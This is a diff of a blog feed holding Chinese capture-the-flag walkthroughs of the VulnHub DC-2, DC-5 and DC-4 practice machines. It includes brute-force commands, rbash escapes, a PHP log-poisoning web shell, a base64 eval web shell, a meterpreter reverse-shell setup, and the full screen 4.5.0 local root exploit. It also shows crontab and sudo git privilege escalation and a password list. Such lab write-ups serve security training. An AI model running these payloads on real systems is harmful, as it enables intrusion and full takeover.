+<p><img src="/2022/04/15/DC-2/1.png" alt="img"></p>
+<p>发现靶机IP为192.168.168.129</p>
+<h3 id="扫描目标主机对外开放的端口"><a href="#扫描目标主机对外开放的端口" class="headerlink" title="扫描目标主机对外开放的端口"></a>扫描目标主机对外开放的端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">namp -sS -p- 192.168.168.129</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/15/DC-2/2.png" alt="img"></p>
+<p>发现开启了端口80<br>还有一个7744，这啥端口啊，对着这个端口再扫一次</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -p 7744 192.168.168.129</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/15/DC-2/2.6.png" alt="img"></p>
+<p>原来是ssh呢，先不管吧<br>浏览192.168.168.129:80</p>
+<p><img src="/2022/04/15/DC-2/2.5.png" alt="img"></p>
+<p>发现flag1</p>
+<p><img src="/2022/04/15/DC-2/3.png" alt="img"></p>
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>查看cms是什么</p>
+<p><img src="/2022/04/15/DC-2/4.png" alt="img"></p>
+<p>好家伙是wordpress，而且还是4.7的<br>用dirsearch看看目录下有什么</p>
+<p><img src="/2022/04/15/DC-2/5.png" alt="img"></p>
+<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>进入后台吧</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://dc-2/wp-login.php?redirect_to=http%3A%2F%2F192.168.168.129%2Fwp-admin%2F&amp;reauth=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/15/DC-2/6.png" alt="img"></p>
+<p>经典登录框<br>既然是WordPress，那就用wpscan看看有什么用户</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo wpscan --url http://dc-2/ –enumerate u </span><br></pre></td></tr></table></figure>
+
+<p>发现以下三个user</p>
+<p><img src="/2022/04/15/DC-2/7.png" alt="img"></p>
+<p>放到burp上进行爆破看看，结果失败了，看来原字典中没有匹配的。<br>flag1中有说到cewl，那就用cewl生成字典再试试</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl http://dc-2/ &gt; dc-2.txt</span><br></pre></td></tr></table></figure>
+
+<p>用生成的dc-2.txt作为字典再跑一次（集束炸弹）</p>
+<p><img src="/2022/04/15/DC-2/8.png" alt="img"></p>
+<p>登录看看</p>
+<p><img src="/2022/04/15/DC-2/9.png" alt="img"></p>
+<p>flag2 get</p>
+<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>这里让我们找其他突破口，看了这个wordpress没用了<br>试着上传，结果跟我说路径创不了，好吧</p>
+<p>回到之前收集到的7744端口，这就是其他突破口，ssh远程连接<br>这里我用xshell连接</p>
+<p><img src="/2022/04/15/DC-2/10.png" alt="img"></p>
+<p>配好后用刚刚得到的两串账号密码登录看看行不行<br>我用tom的是可以的<br>进去后发现不能用很多命令，存在命令受限问题<br>ls ，vi 能用。<br>ls，发现当前目录存在flag3.txt，用vi查看</p>
+<p><img src="/2022/04/15/DC-2/11.png" alt="img"></p>
+<h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>我这里用了vi绕过受限</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi</span><br><span class="line">:<span class="built_in">set</span> shell=/bin/bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
+
+<p>发现能用cd了<br>看看有什么敏感目录吧<br>最后在&#x2F;home&#x2F;jerryx下发现flag4.txt</p>
+<p><img src="/2022/04/15/DC-2/12.png" alt="img"></p>
+<h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>git提权是吧<br>结果发现git不给用，还是得解决命令受限问题<br>最后找到了这种，rbash绕过<br>参考(<a href="https://xz.aliyun.com/t/7642#toc-3">https://xz.aliyun.com/t/7642#toc-3</a>)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/15/DC-2/13.png" alt="img"></p>
+<p>这里我们要改两个地方，其中是PATH与SHELL</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin/:/usr/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> SHELL=/bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>这样我们就能用其他命令了<br>发现tom不是sudoer，那就切成jerry</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo git -p <span class="built_in">help</span></span><br><span class="line">:!/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>提权成功<br>查看&#x2F;root<br>发现最后的flag</p>
+<p><img src="/2022/04/15/DC-2/14.png" alt="img"></p>
+<p>DC2 clear</p>
+]]></content>
       <categories>
-          
-          <category> 实践 </category>
-          
+        <category>实践</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> 渗透 </tag>
-            
-            <tag> 提权 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>DC-5</title>
-      <link href="/2022/04/17/DC-5/"/>
-      <url>/2022/04/17/DC-5/</url>
-      
-        <content type="html"><![CDATA[<p>渗透环境：DC5 <a href="https://www.vulnhub.com/entry/dc-5,314/">https://www.vulnhub.com/entry/dc-5,314/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫面存活主机"><a href="#扫面存活主机" class="headerlink" title="扫面存活主机"></a>扫面存活主机</h3><p>还是老规矩，nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-5/1.png" alt="img"></p><p>发现目标主机为192.168.168.133</p><h3 id="扫描主机开放端口"><a href="#扫描主机开放端口" class="headerlink" title="扫描主机开放端口"></a>扫描主机开放端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- 192.168.168.133</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-5/2.png" alt="img"></p><p>开放了80端口浏览器打开</p><p><img src="/2022/04/17/DC-5/3.png" alt="img"></p><h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>只看到这个页面有注入的可能，试试<br>然后返回了thankyou.php过来</p><p><img src="/2022/04/17/DC-5/4.png" alt="img"></p><p>看看有没有存在sql注入，xss注入的可能<br>测试过，没反应<br>最后发现可以文件包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-5/5.png" alt="img"></p><p>这里用日志注入的方法getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.168.133/&lt;?php @assert($_POST[&#x27;test&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>查看日志文件位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-5/6.png" alt="img"></p><p>查看文件，用蚁剑连接</p><p><img src="/2022/04/17/DC-5/8.png" alt="img"></p><h3 id="msf反弹shell"><a href="#msf反弹shell" class="headerlink" title="msf反弹shell"></a>msf反弹shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload payload/php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.168.128 //攻击机ip</span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.168.128 LPORT=4444 -f raw &gt; shell.php //生成shell</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>将shell.php通过蚁剑上传到&#x2F;tmp<br>访问对应shell.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thankyou.php?file=/tmp/shell.php</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-5/9.png" alt="img"></p><p>连接成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-5/10.png" alt="img"></p><p>有个screen-4.5.0看看有没有漏洞可用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br><span class="line"><span class="built_in">cd</span> /usr/share/exploitdb/exploits/linux/local</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-5/11.png" alt="img"></p><p>把第一个文件通过蚁剑上传，看看能不能run<br>结果报错了<br>分析对应sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># screenroot.sh</span></span><br><span class="line"><span class="comment"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="comment"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="comment"># HACK THE PLANET</span></span><br><span class="line"><span class="comment"># ~ infodox (25/1/2017) </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;~ gnu/screenroot ~&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] First, we create our shell and library...&quot;</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/libhax.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">__attribute__ ((__constructor__))</span></span><br><span class="line"><span class="string">void dropshell(void)&#123;</span></span><br><span class="line"><span class="string">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span></span><br><span class="line"><span class="string">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span></span><br><span class="line"><span class="string">    unlink(&quot;/etc/ld.so.preload&quot;);</span></span><br><span class="line"><span class="string">    printf(&quot;[+] done!\n&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/libhax.c</span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/rootshell.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">int main(void)&#123;</span></span><br><span class="line"><span class="string">    setuid(0);</span></span><br><span class="line"><span class="string">    setgid(0);</span></span><br><span class="line"><span class="string">    seteuid(0);</span></span><br><span class="line"><span class="string">    setegid(0);</span></span><br><span class="line"><span class="string">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span> <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure><p>根据上面逻辑得到3段代码，本地编译<br>libhax.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br></pre></td></tr></table></figure><p>rootshell.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure><p>run.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so... </span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure><p>把run.sh, rootshell, libhax.so上传到&#x2F;tmp文件夹中<br>执行run.sh文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run.sh</span><br></pre></td></tr></table></figure><p>成功提权后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/thisistheflag.txt</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-5/12.png" alt="img"></p><p>获得flag，DC-5clear</p>]]></content>
-      
-      
+      <tags>
+        <tag>渗透</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC-4</title>
+    <url>/2022/04/17/DC-4/</url>
+    <content><![CDATA[<p>渗透环境：DC4 <a href="https://www.vulnhub.com/entry/dc-32,312/">https://www.vulnhub.com/entry/dc-32,312/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫面存活主机"><a href="#扫面存活主机" class="headerlink" title="扫面存活主机"></a>扫面存活主机</h3><p>还是老规矩，nmap</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/DC-4/1.png" alt="img"></p>
+<p>发现目标主机为192.168.168.131</p>
+<h3 id="扫描主机开放端口"><a href="#扫描主机开放端口" class="headerlink" title="扫描主机开放端口"></a>扫描主机开放端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.168.131</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/DC-4/2.png" alt="img"></p>
+<p>开放了80端口和22端口，浏览器打开</p>
+<p><img src="/2022/04/17/DC-4/cover.png" alt="img"></p>
+<h3 id="收集其他信息"><a href="#收集其他信息" class="headerlink" title="收集其他信息"></a>收集其他信息</h3><p>用dirsearch看看目录情况</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.168.130/ -e *</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/DC-4/3.png" alt="img"></p>
+<p>有个command.php，应该是远程命令执行了</p>
+<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>显示用burp进行爆破</p>
+<p><img src="/2022/04/17/DC-4/4.png" alt="img"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">账号：admin</span><br><span class="line">密码：happy</span><br></pre></td></tr></table></figure>
+
+<p>登录进去</p>
+<p><img src="/2022/04/17/DC-4/5.png" alt="img"></p>
+<p>确实是命令执行<br>抓包<br>修改上传参数<br>上一个base64木马上去</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydMMWFuZyddKTs/Pg== &quot;</span>|<span class="built_in">base64</span> -d &gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p>上传成功</p>
+<p><img src="/2022/04/17/DC-4/6.png" alt="img"></p>
+<p>蚁剑连接</p>
+<p><img src="/2022/04/17/DC-4/7.png" alt="img"></p>
+<p>查看&#x2F;home下有什么内容<br>在&#x2F;home&#x2F;jim&#x2F;backups&#x2F;old-passwords.bak下找到了旧密码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">000000</span><br><span class="line">12345</span><br><span class="line">iloveyou</span><br><span class="line">1q2w3e4r5t</span><br><span class="line">1234</span><br><span class="line">123456a</span><br><span class="line">qwertyuiop</span><br><span class="line">monkey</span><br><span class="line">123321</span><br><span class="line">dragon</span><br><span class="line">654321</span><br><span class="line">666666</span><br><span class="line">123</span><br><span class="line">myspace1</span><br><span class="line">a123456</span><br><span class="line">121212</span><br><span class="line">1qaz2wsx</span><br><span class="line">123qwe</span><br><span class="line">123abc</span><br><span class="line">tinkle</span><br><span class="line">target123</span><br><span class="line">gwerty</span><br><span class="line">1g2w3e4r</span><br><span class="line">gwerty123</span><br><span class="line">zag12wsx</span><br><span class="line">7777777</span><br><span class="line">qwerty1</span><br><span class="line">1q2w3e4r</span><br><span class="line">987654321</span><br><span class="line">222222</span><br><span class="line">qwe123</span><br><span class="line">qwerty123</span><br><span class="line">zxcvbnm</span><br><span class="line">555555</span><br><span class="line">112233</span><br><span class="line">fuckyou</span><br><span class="line">asdfghjkl</span><br><span class="line">12345a</span><br><span class="line">123123123</span><br><span class="line">1q2w3e</span><br><span class="line">qazwsx</span><br><span class="line">loveme1</span><br><span class="line">juventus</span><br><span class="line">jennifer1</span><br><span class="line">!~!1</span><br><span class="line">bubbles</span><br><span class="line">samuel</span><br><span class="line">fuckoff</span><br><span class="line">lovers</span><br><span class="line">cheese1</span><br><span class="line">0123456</span><br><span class="line">123asd</span><br><span class="line">999999999</span><br><span class="line">madison</span><br><span class="line">elizabeth1</span><br><span class="line">music</span><br><span class="line">buster1</span><br><span class="line">lauren</span><br><span class="line">david1</span><br><span class="line">tigger1</span><br><span class="line">123qweasd</span><br><span class="line">taylor1</span><br><span class="line">carlos</span><br><span class="line">tinkerbell</span><br><span class="line">samantha1</span><br><span class="line">Sojdlg123aljg</span><br><span class="line">joshua1</span><br><span class="line">poop</span><br><span class="line">stella</span><br><span class="line">myspace123</span><br><span class="line">asdasd5</span><br><span class="line">freedom1</span><br><span class="line">whatever1</span><br><span class="line">xxxxxx</span><br><span class="line">00000</span><br><span class="line">valentina</span><br><span class="line">a1b2c3</span><br><span class="line">741852963</span><br><span class="line">austin</span><br><span class="line">monica</span><br><span class="line">qaz123</span><br><span class="line">lovely1</span><br><span class="line">music1</span><br><span class="line">harley1</span><br><span class="line">family1</span><br><span class="line">spongebob1</span><br><span class="line">steven</span><br><span class="line">nirvana</span><br><span class="line">1234abcd</span><br><span class="line">hellokitty</span><br><span class="line">thomas1</span><br><span class="line">cooper</span><br><span class="line">520520</span><br><span class="line">muffin</span><br><span class="line">christian1</span><br><span class="line">love13</span><br><span class="line">fucku2</span><br><span class="line">arsenal1</span><br><span class="line">lucky7</span><br><span class="line">diablo</span><br><span class="line">apples</span><br><span class="line">george1</span><br><span class="line">babyboy1</span><br><span class="line">crystal</span><br><span class="line">1122334455</span><br><span class="line">player1</span><br><span class="line">aa123456</span><br><span class="line">vfhbyf</span><br><span class="line">forever1</span><br><span class="line">Password</span><br><span class="line">winston</span><br><span class="line">chivas1</span><br><span class="line">sexy</span><br><span class="line">hockey1</span><br><span class="line">1a2b3c4d</span><br><span class="line">pussy</span><br><span class="line">playboy1</span><br><span class="line">stalker</span><br><span class="line">cherry</span><br><span class="line">tweety</span><br><span class="line">toyota</span><br><span class="line">creative</span><br><span class="line">gemini</span><br><span class="line">pretty1</span><br><span class="line">maverick</span><br><span class="line">brittany1</span><br><span class="line">nathan1</span><br><span class="line">letmein1</span><br><span class="line">cameron1</span><br><span class="line">secret1</span><br><span class="line">google1</span><br><span class="line">heaven</span><br><span class="line">martina</span><br><span class="line">murphy</span><br><span class="line">spongebob</span><br><span class="line">uQA9Ebw445</span><br><span class="line">fernando</span><br><span class="line">pretty</span><br><span class="line">startfinding</span><br><span class="line">softball</span><br><span class="line">dolphin1</span><br><span class="line">fuckme</span><br><span class="line">test123</span><br><span class="line">qwerty1234</span><br><span class="line">kobe24</span><br><span class="line">alejandro</span><br><span class="line">adrian</span><br><span class="line">september</span><br><span class="line">aaaaaa1</span><br><span class="line">bubba1</span><br><span class="line">isabella</span><br><span class="line">abc123456</span><br><span class="line">password3</span><br><span class="line">jason1</span><br><span class="line">abcdefg123</span><br><span class="line">loveyou1</span><br><span class="line">shannon</span><br><span class="line">100200</span><br><span class="line">manuel</span><br><span class="line">leonardo</span><br><span class="line">molly1</span><br><span class="line">flowers</span><br><span class="line">123456z</span><br><span class="line">007007</span><br><span class="line">password.</span><br><span class="line">321321</span><br><span class="line">miguel</span><br><span class="line">samsung1</span><br><span class="line">sergey</span><br><span class="line">sweet1</span><br><span class="line">abc1234</span><br><span class="line">windows</span><br><span class="line">qwert123</span><br><span class="line">vfrcbv</span><br><span class="line">poohbear</span><br><span class="line">d123456</span><br><span class="line">school1</span><br><span class="line">badboy</span><br><span class="line">951753</span><br><span class="line">123456c</span><br><span class="line">111</span><br><span class="line">steven1</span><br><span class="line">snoopy1</span><br><span class="line">garfield</span><br><span class="line">YAgjecc826</span><br><span class="line">compaq</span><br><span class="line">candy1</span><br><span class="line">sarah1</span><br><span class="line">qwerty123456</span><br><span class="line">123456l</span><br><span class="line">eminem1</span><br><span class="line">141414</span><br><span class="line">789789</span><br><span class="line">maria</span><br><span class="line">steelers</span><br><span class="line">iloveme1</span><br><span class="line">morgan1</span><br><span class="line">winner</span><br><span class="line">boomer</span><br><span class="line">lolita</span><br><span class="line">nastya</span><br><span class="line">alexis1</span><br><span class="line">carmen</span><br><span class="line">angelo</span><br><span class="line">nicholas1</span><br><span class="line">portugal</span><br><span class="line">precious</span><br><span class="line">jackass1</span><br><span class="line">jonathan1</span><br><span class="line">yfnfif</span><br><span class="line">bitch</span><br><span class="line">tiffany</span><br><span class="line">rabbit</span><br><span class="line">rainbow1</span><br><span class="line">angel123</span><br><span class="line">popcorn</span><br><span class="line">barbara</span><br><span class="line">brandy</span><br><span class="line">starwars1</span><br><span class="line">barney</span><br><span class="line">natalia</span><br><span class="line">jibril04</span><br><span class="line">hiphop</span><br><span class="line">tiffany1</span><br><span class="line">shorty</span><br><span class="line">poohbear1</span><br><span class="line">simone</span><br><span class="line">albert</span><br><span class="line">marlboro</span><br><span class="line">hardcore</span><br><span class="line">cowboys</span><br><span class="line">sydney</span><br><span class="line">alex</span><br><span class="line">scorpio</span><br><span class="line">1234512345</span><br><span class="line">q12345</span><br><span class="line">qq123456</span><br><span class="line">onelove</span><br><span class="line">bond007</span><br><span class="line">abcdefg1</span><br><span class="line">eagles</span><br><span class="line">crystal1</span><br><span class="line">azertyuiop</span><br><span class="line">winter</span><br><span class="line">sexy12</span><br><span class="line">angelina</span><br><span class="line">james</span><br><span class="line">svetlana</span><br><span class="line">fatima</span><br><span class="line">123456k</span><br><span class="line">icecream</span><br><span class="line">popcorn1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>用hydra进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l jim -P ./dc4.txt  ssh://192.168.168.131</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/DC-4/8.png" alt="img"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">账号：jim</span><br><span class="line">密码：jibril04</span><br></pre></td></tr></table></figure>
+
+<p>用xshll或是kali连接到目标主机<br>看看身份</p>
+<p><img src="/2022/04/17/DC-4/9.png" alt="img"></p>
+<p>通过上传漏洞探测器，发现没有可用的提权漏洞<br>发现之前存在的一条信息</p>
+<p><img src="/2022/04/17/DC-4/10.png" alt="img"></p>
+<p>我有一条信息<br>去看看吧</p>
+<p><img src="/2022/04/17/DC-4/11.png" alt="img"></p>
+<p>这样就知道了charles的密码了</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">账号：charles</span><br><span class="line">密码： ^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure>
+
+<p>登录charles的号看看<br>看了charles可以用sudo了</p>
+<p><img src="/2022/04/17/DC-4/12.png" alt="img"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>teehee是一个小的编辑器<br>这里我通过crontab提权</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo teehee /etc/crontab</span><br><span class="line">* * * * * root <span class="built_in">chmod</span> 4777 /bin/sh  //4777普通用户也能执行</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/DC-4/14.png" alt="img"></p>
+<p>分钟 小时 日期 月 周 用户 命令<br>ctrl+c退出</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/sh</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">cat</span> /root/the-flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/DC-4/13.png" alt="img"></p>
+]]></content>
       <categories>
-          
-          <category> 实践 </category>
-          
+        <category>实践</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> 渗透 </tag>
-            
-            <tag> 提权 </tag>
-            
-            <tag> 文件包含 </tag>
-            
